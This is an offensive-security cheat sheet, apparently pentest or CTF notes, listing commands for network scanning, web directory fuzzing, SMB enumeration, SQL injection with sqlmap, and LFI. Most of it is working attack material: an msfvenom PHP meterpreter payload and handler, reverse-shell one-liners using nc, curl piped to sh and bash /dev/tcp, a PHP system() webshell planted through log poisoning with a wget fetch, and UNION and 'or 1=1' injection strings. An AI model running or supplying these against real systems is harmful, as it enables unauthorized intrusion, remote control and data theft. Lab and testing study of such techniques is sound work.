# Basic Enumeration

#### NMAP check for live hosts
- `sudo nmap -sn 10.0.0.0/24 -oN discovery.nmap`

#### sort
- `cat discovery.nmap | grep "for" | cut -d " " -f 5 > ips.txt` 

#### NMAP scan
- `sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open`

#### NMAP Scan
- `sudo nmap -sC -sV -oA testbox 10.0.0.1`

####Other type scans
- `nc -nv -u -z -w 1 192.168.1.44 1300-1500`

### Web Directory Enumeration
#### gobuster
- `gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/big.txt`

#### wfuzz
######  directory    
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 -u 10.0.0.1/FUZZ`  
###### filename + extension  
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt --hc 404 -u 10.0.0.1/FUZZ%FUZ2Z`  
###### deeper enumeration  
- `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/big.txt -z file,/usr/share/wordlists/dirb/extensions_common.txt --hc 404 -u 10.0.0.1/FUZZ/FU2Z%FUZ3Z`

### SMB Enumeration

- `enum4linux -a 10.0.0.1`
- `smbclient -U "user" -L 10.0.0.1`
- `showmount -e 10.0.0.1`
- `sudo mount -t cifs //10.0.0.1/share$ smb/ -o user="user"`
- `smbclient \\\\10.0.0.1\\sharename -U guest`

### LDAP Enumeration

- `jxplorer`

### SQLMAP 
- if there is a parameter then one could use sqlmap
- e.g http://10.0.0.1/?id=2
- use burp to get the request page and save it as req.txt
- then run
- `sqlmap -r req.txt --tamper=space2comment --dump-all --dbms mysql`

- try `' or 1=1--` in the username and password field
- enumerate how many columns there are
- `user='UNION SELECT NULL,'test',NULL,NULL--&password=admin`

### msfvenom and msfconsole reverse shell

- `msfvenom -p php/meterpreter_reverse_tcp lhost=10.0.0.1 lport=9998 -o moon.php`

###### msfconsole
- `use exploit/multi/handler`
- `set payload php/meterpreter_reverse_tcp`
- `set LHOST 10.0.0.1`
- `set LPORT  9998`
- `run`

###### Reverse shells

- `mkfifo /tmp/boop;nc IP PORT 0</tmp/boop | /bin/sh -i 2>&1 | tee /tmp/boop`
- `curl http://IP:port/shell.sh | sh`
- `exec("/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'");`
- `/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'`

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`

###### Web enumeration

LFI
- `http://10.0.0.1/?page=index.php`
- `http://10.0.0.1/?page=../../../etc/passwd`
- `http://10.0.0.1/?page=php://filter/convert.base64-encode/resource=index.php`

Log injection 
- change user agent
- `<?php system($_GET['cmd']); ?>`
- `http://10.0.0.1/?page=../../../var/apache2/access.log?cmd=wget%20http://IP:PORT/shell.php`
